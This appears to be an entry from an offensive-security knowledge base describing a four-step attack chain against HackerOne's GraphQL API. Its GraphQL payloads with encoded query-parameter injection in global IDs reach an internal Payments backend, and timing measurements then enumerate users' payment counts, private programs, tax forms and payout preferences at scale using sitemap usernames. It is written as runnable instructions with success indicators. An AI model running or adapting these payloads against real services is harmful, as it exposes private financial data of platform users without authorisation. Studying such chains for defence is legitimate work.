---
tags:
  - graphql-injection
  - timing-attack
  - information-disclosure
  - parameter-injection
  - activeresource
type: attack_chain
tools:
  - '[[tools/ActiveResource]]'
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Test-GraphQL-Node-Interface]]'
  - '[[procedures/Inject-Query-Parameters-via-Global-ID]]'
  - '[[procedures/Execute-Timing-Attack-on-Payments]]'
  - '[[procedures/Enumerate-Sensitive-Data-using-Sitemap]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:25:53.629Z'
description: >-
  A multi-stage attack exploiting unencoded resource identifiers in HackerOne's
  GraphQL node interface to inject query parameters into the Payments backend,
  enabling timing attacks for enumerating sensitive payment and program data.
skill_level: intermediate
impact_level: high
id: 3137e9c4-d124-47b4-bec8-bf8abb72901b
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
---
# GraphQL Parameter Injection via ActiveResource for Timing-Based Payment Enumeration

Multi-stage attack chain demonstrating exploitation of HackerOne's GraphQL interface to inject parameters into the internal Payments backend, allowing timing-based enumeration of sensitive financial data like payment counts, private programs, tax forms, and payout preferences.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Recon GraphQL Interface] --> B[Inject Parameters]
    B --> C[Timing Attack]
    C --> D[Enumerate Data]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/ActiveResource]] (underlying gem, but use a GraphQL client like curl or Postman for queries)
- GraphQL client (e.g., curl for API requests)

### Target Environment

- Web platform with GraphQL API (e.g., HackerOne's API)
- Access to public GraphQL endpoint
- No specific ports; assumes HTTPS/443

### Initial Access Requirements

- Valid API access to GraphQL (authenticated or public)
- Knowledge of global ID format (e.g., gid://hackerone/PaymentsLibrary::Payment/ID)
- List of usernames/handles from public sitemap

## Detailed Attack Procedures

### Step 1: Test GraphQL Node Interface
procedure: [[procedures/Test-GraphQL-Node-Interface]]

**Objective**: Verify the GraphQL node interface translates global IDs to ActiveResource calls without encoding, setting up for injection.

**Instructions**: Start by querying a standard global ID for a Payment object using [[commands/query-standard-global-id]] to observe normal backend request. Then test with a non-integer ID using [[commands/query-non-integer-id]] to confirm lack of validation. Follow with encoded dot injection via [[commands/inject-encoded-dot]] to append .json without path breakage.

```graphql
query { node(id: "gid://hackerone/PaymentsLibrary::Payment/1") { ... on User { id } } }
```

**Expected Output**: Backend HTTP GET /payments/1 (normal), /payments/something (no error), /payments/1.json (appended format).

**Success Indicators**:
- No exceptions on invalid IDs
- Path manipulation succeeds without 404

### Step 2: Inject Query Parameters via Global ID
procedure: [[procedures/Inject-Query-Parameters-via-Global-ID]]

**Objective**: Exploit lack of encoding in ActiveResource to inject URL-encoded query parameters into the Payments backend path.

**Instructions**: Craft a global ID with encoded '?' and '&' (as %3f and %26) using [[commands/inject-query-parameters]] to append filters like core_hacker_username=jobert&core_team_handle=security. Include a trailing %26 to handle .json routing.

```graphql
query { node(id: "gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3djobert%26core_team_handle%3dsecurity%26") { ... on User { id } } }
```

**Expected Output**: Backend HTTP GET /payments/?core_hacker_username=jobert&core_team_handle=security%26.json; expect 500 error but confirm injection via response headers or logs.

**Success Indicators**:
- Query parameters appear in backend request
- No path decoding errors

### Step 3: Execute Timing Attack on Payments
procedure: [[procedures/Execute-Timing-Attack-on-Payments]]

**Objective**: Measure response time differences to infer existence and count of Payment objects based on filter matches.

**Instructions**: Send multiple queries with varying parameters using [[commands/perform-timing-attack]] and time responses. Compare ~400ms (no matches) vs. ~2000ms (matches). Test combinations like core_hacker_username=jobert&core_team_handle=security (0 matches) vs. =fransrosen (2 matches).

```graphql
query { node(id: "gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3djobert%26core_team_handle%3dfransrosen%26") { ... on User { id } } }
```

**Expected Output**: Varied RTTs; 500 errors with longer delays indicating matches due to array vs. single record handling.

**Success Indicators**:
- Consistent timing delta between match/no-match
- Infer approximate counts from delay patterns

### Step 4: Enumerate Sensitive Data using Sitemap
procedure: [[procedures/Enumerate-Sensitive-Data-using-Sitemap]]

**Objective**: Use public sitemap data to scale enumeration of payment counts, private programs, tax forms, and payout preferences.

**Instructions**: Extract usernames/handles from public sitemap, then iterate timing queries with [[commands/enumerate-with-sitemap]] for each combination to infer sensitive info via timings.

```graphql
query { node(id: "gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3d[username]%26core_team_handle%3d[handle]%26") { ... on User { id } } }
```

**Expected Output**: Aggregated inferences: e.g., high counts indicate private programs; specific delays reveal tax form types or preferences.

**Success Indicators**:
- Patterns emerge for multiple users/teams
- Disclosure of non-public data existence

## Attack Chain Summary

### Key Achievements

1. Successful parameter injection into internal backend
2. Reliable timing oracle for data enumeration
3. Exposure of sensitive financial and program details without direct access

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Account Discovery]]

### MITRE ATT&CK Tactics

- [[Discovery]]
- [[Collection]]

---

*Last updated: 2023-10-01T00:00:00Z*
